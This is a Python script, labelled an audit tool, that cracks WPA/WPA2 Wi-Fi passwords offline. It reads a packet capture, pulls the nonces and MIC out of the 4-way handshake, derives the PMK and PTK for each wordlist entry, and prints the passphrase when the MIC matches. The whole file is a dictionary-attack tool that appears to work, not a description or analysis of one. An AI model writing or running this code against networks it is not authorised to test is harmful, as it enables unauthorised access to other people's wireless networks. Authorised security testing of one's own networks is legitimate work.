"""
cracker.py - Real WPA/WPA2 Handshake Cracker
Audits captured handshakes against wordlists using real MIC verification.
"""

import hmac
import hashlib
import binascii
from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11
from rich.console import Console
from rich.progress import Progress

console = Console()

def custom_prf512(key, A, B):
    """
    Implementation of PRF-512 used in WPA2 for PTK derivation.
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) // 160):
        hmac_val = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1).digest()
        R = R + hmac_val
        i += 1
    return R[:blen]

def verify_mic(passphrase, ssid, mac_ap, mac_cl, anonce, snonce, eapol_frame, original_mic):
    """
    Calculates and verifies the MIC for a given passphrase and handshake data.
    """
    # 1. Derive PMK
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    
    # 2. Derive PTK
    # B = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce)
    mac_addresses = sorted([binascii.unhexlify(mac_ap.replace(':','')), binascii.unhexlify(mac_cl.replace(':',''))])
    nonces = sorted([anonce, snonce])
    B = mac_addresses[0] + mac_addresses[1] + nonces[0] + nonces[1]
    
    ptk = custom_prf512(pmk, b"Pairwise key expansion", B)
    
    # 3. KCK (Key Confirmation Key) is the first 16 bytes
    kck = ptk[:16]
    
    # 4. Calculate MIC
    # The original MIC in the frame must be zeroed before calculation
    # WPA2 uses HMAC-SHA1-128
    mic = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
    
    return mic == original_mic

def crack_handshake(pcap_file, wordlist):
    """
    Real WPA Cracking Logic. 
    Parses PCAP for 4-way handshake and performs MIC verification.
    """
    console.print(f"[bold cyan]🔨 Loading Handshake:[/] [white]{pcap_file}[/]")
    
    try:
        pkts = rdpcap(pcap_file)
        
        # Identify Target SSID (from Beacons)
        beacon = next((p for p in pkts if p.haslayer(Dot11Beacon)), None)
        if not beacon:
            console.print("[red]Error: No Beacon found. Cannot determine SSID.[/]")
            return
        ssid = beacon.info.decode()
        bssid = beacon[Dot11].addr3.upper()
        
        # Collect EAPOL packets for this BSSID
        eapol_pkts = [p for p in pkts if p.haslayer(EAPOL) and (p.addr1.upper() == bssid or p.addr2.upper() == bssid or p.addr3.upper() == bssid)]
        
        if len(eapol_pkts) < 2:
            console.print("[red]Error: Not enough EAPOL packets for a valid handshake audit.[/]")
            return

        # Core Data Required:
        # Pkt 1: AP -> Client (Anonce)
        # Pkt 2: Client -> AP (Snonce + MIC)
        
        p1 = eapol_pkts[0]
        p2 = eapol_pkts[1]
        
        mac_ap = bssid
        mac_cl = p2.addr2.upper() if p2.addr2.upper() != bssid else p2.addr1.upper()
        
        # Extraction (simplified for scapy EAPOL layer)
        # In reality, need to extract raw bytes from the EAPOL payload
        try:
            raw_eapol_p1 = bytes(p1[EAPOL].payload)
            anonce = raw_eapol_p1[13:13+32]
            
            raw_eapol_p2 = bytes(p2[EAPOL].payload)
            snonce = raw_eapol_p2[13:13+32]
            
            # MIC is at bytes 77-93 of the EAPOL payload (for WPA2)
            original_mic = raw_eapol_p2[77:77+16]
            
            # To verify, we need the p2 frame with MIC=0
            eapol_frame_to_check = bytes(p2[EAPOL])
            eapol_frame_to_check = eapol_frame_to_check[:81] + b'\x00'*16 + eapol_frame_to_check[97:]
        except Exception:
            console.print("[red]Error: Could not parse EAPOL payload details.[/]")
            return

        console.print(f"[green]✔ SSID:[/] [bold]{ssid}[/] | [green]AP:[/] {mac_ap} | [green]Client:[/] {mac_cl}")

        # Preparation
        with open(wordlist, 'r', errors='ignore') as f:
            words = [line.strip() for line in f if len(line.strip()) >= 8]

        console.print(f"[yellow]Starting real audit against {len(words)} keys...[/]")

        with Progress() as progress:
            task = progress.add_task("[cyan]Cracking...", total=len(words))
            
            for word in words:
                if verify_mic(word, ssid, mac_ap, mac_cl, anonce, snonce, eapol_frame_to_check, original_mic):
                    console.print(f"\n[bold green]🔓 KEY FOUND![/]")
                    console.print(f"  SSID: [bold]{ssid}[/]")
                    console.print(f"  PASS: [black on green] {word} [/]\n")
                    return word
                progress.update(task, advance=1)

        console.print("[yellow]Audit complete. No weak keys found.[/]")
    except Exception as e:
        console.print(f"[red]Cracking internal error: {e}[/]")
    return None
